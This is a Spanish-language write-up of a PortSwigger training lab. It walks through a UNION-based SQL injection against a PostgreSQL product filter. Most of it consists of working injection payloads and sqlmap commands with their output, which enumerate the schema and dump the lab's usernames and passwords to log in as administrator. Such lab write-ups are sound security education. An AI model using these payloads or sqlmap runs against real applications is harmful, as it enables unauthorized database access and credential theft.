---
title: "SQL injection UNION attack, retrieving multiple values in a single column"
description: "Laboratorio de Portswigger sobre SQLI"
date: 2024-11-15 12:40:00 +0800
lang: es-ES
author: Justice-Reaper
categories:
  - Portswigger Labs
  - SQLI
tags:
  - Portswigger Labs
  - SQLI (Error Based)
  - SQL injection UNION attack, retrieving multiple values in a single column
  - PostgreSQL
image:
  path: /assets/img/Portswigger/Portswigger.png
---

## Certificaciones

- eWPT
- eWPTXv2
- OSWE
- BSCP
  
## Descripción

Este `laboratorio` contiene una `vulnerabilidad` de `inyección SQL` en el `filtro` de `categoría` de `productos`. Los `resultados` de la `consulta` se `devuelven` en la `respuesta` de la `aplicación`, por lo que hay que utilizar un `ataque UNION` para recuperar datos de otras tablas. La base de datos contiene una tabla diferente llamada `users`, con columnas llamadas `username` y `password`. Para resolver el laboratorio, hay que realizar un ataque de `inyección SQL UNION` que recupere todos los nombres de `usuario` y `contraseñas`, y utilizar la información para `iniciar sesión` como el usuario `administrador`

---

## Guía de SQLI

`Antes` de `completar` este `laboratorio` es recomendable `leerse` esta `guía de SQLI` [https://justice-reaper.github.io/posts/SQLI/](https://justice-reaper.github.io/posts/SQLI/)

## Resolución

Al `acceder` a la `web` nos sale esto

![](/assets/img/SQLI-Lab-10/image_1.png)

Si hacemos `click` en alguno de los `filtros`, nos filtrará los artículos por esta categoría

![](/assets/img/SQLI-Lab-10/image_2.png)

`Capturamos` la `petición` con `Burpsuite` y `añadimos` una `comilla` simple `'`

![](/assets/img/SQLI-Lab-10/image_3.png)

Si enviamos esta petición nos devolverá un `Internal Server Error`, lo cual quiere decir que estamos `interfiriendo` con la `consulta SQL` que se está produciendo

![](/assets/img/SQLI-Lab-10/image_4.png)

Si usamos este `payload` mediante el cual añadimos una comparación que `siempre` es `verdad` como `1=1`, ignoramos el resto de la consulta SQL con `-- - ` y enviamos la petición nuevamente no obtenemos ningún fallo, lo que quiere decir que la inyección `SQL` ha sido `exitosa`

```
/filter?category=Gifts'+or+1=1--+-+
```

![](/assets/img/SQLI-Lab-10/image_5.png)

Usando `order by` podemos saber el `número` de `columnas` que tiene la `tabla`, empleando este `payload` el resultado es un `200 OK`

```
/filter?category=Gifts'+order+by+2--+-+
```

Sin embargo, si empleamos este otro `payload` donde hacemos `order by 3`, nos devuelve un `Internal Server Error`. Esto se debe a que al no existir `tres columnas` nos `arroja` un `fallo`

```
/filter?category=Gifts'+order+by+3--+-+
```

Una vez sabemos el número de columnas, usando `union select` vamos a obtener la información, en este caso, como no hemos recibido `ningún error`, podemos descartar que la `base` de `datos` usada sea `Oracle` debido a que en `Oracle` debemos añadir `from dual` al final, de lo contrario, nos arrojará un error

```
/filter?category=Gifts'+union+select+null,null--+-+
```

Confirmamos la `base` de `datos` en uso y también el su `versión`

```
/filter?category=Gifts'+union+select+null,version()--+-+
```

![](/assets/img/SQLI-Lab-10/image_6.png)


`Listamos` el `nombre` de todas las `bases` de `datos`

```
/filter?category=Gifts'+union+select+null,string_agg(datname,',')+from+pg_database--+-+
```

![](/assets/img/SQLI-Lab-10/image_7.png)

`Listamos` la `base de datos actual`

```
/filter?category=Gifts'+union+select+null,current_database()--+-+
```

![](/assets/img/SQLI-Lab-10/image_8.png)

`Listamos` los `esquemas` para la `base de datos en uso`

```
/filter?category=Gifts'+union+select+null,schema_name+from+information_schema.schemata--+-+
```

![](/assets/img/SQLI-Lab-10/image_9.png)

`Listamos` el `nombre` de las `tablas`

```
/filter?category=Gifts'+union+select+null,table_name+from+information_schema.tables+where+table_schema='public'--+-+
```

![](/assets/img/SQLI-Lab-10/image_10.png)

`Listamos` las `columnas` de la tabla `users`

```
/filter?category=Gifts'+union+select+null,string_agg(column_name,',')+from+information_schema.columns+where+table_name='users'--+-+
```

![](/assets/img/SQLI-Lab-10/image_11.png)

`Listamos` el `contenido` de la columna `username` y `password`

```
/filter?category=Gifts'+union+select+null,string_agg(username||':'||password,',+')+from+users--+-+
```

![](/assets/img/SQLI-Lab-10/image_12.png)

Podríamos obtener también la `contraseña` del usuario `administrator` usando `sqlmap`, lo primero es `listar` las `bases` de `datos`

```
# sqlmap -u 'https://0ae00021044da00681a6e43e005f00d6.web-security-academy.net/filter?category=Corporate+gifts' --risk=3 --level=5 --random-agent --dbs --batch --threads 2   
available databases [3]:
[*] information_schema
[*] pg_catalog
[*] public
```

`Listamos` las `tablas` de la base de datos `public`

```
# sqlmap -u 'https://0ae00021044da00681a6e43e005f00d6.web-security-academy.net/filter?category=Corporate+gifts' --risk=3 --level=5 --random-agent -D public --tables --batch --threads 2 
Database: public
[2 tables]
+--------------+
| products     |
| users        |
+--------------+
```

`Listamos` las `columnas` de la tabla `users`

```
# sqlmap -u 'https://0ae00021044da00681a6e43e005f00d6.web-security-academy.net/filter?category=Corporate+gifts' --risk=3 --level=5 --random-agent -D public -T users --columns --batch --threads 2  
Database: public
Table: users
[3 columns]
+-----------------+---------+
| Column          | Type    |
+-----------------+---------+
| email           | varchar |
| password        | varchar |
| username        | varchar |
+-----------------+---------+
```

`Dumpeamos` el contenido de `password` y `username` de la tabla `users`

```
# sqlmap -u 'https://0ae00021044da00681a6e43e005f00d6.web-security-academy.net/filter?category=Corporate+gifts' --risk=3 --level=5 --random-agent -D public -T users -C password,username --dump --batch --threads 2 
Database: public
Table: users
[3 entries]
+----------------------+-----------------+
| password             | username        |
+----------------------+-----------------+
| 77mz52vp06wko24p8cl3 | administrator   |
| aqcaasm9mubsp9ngy3m7 | wiener          |
| 1smn2n4jv1mv1uzv5hqm | carlos          |
+----------------------+-----------------+
```

Nos `logueamos` con las `credenciales` del usuario `administrador`

![](/assets/img/SQLI-Lab-10/image_13.png)
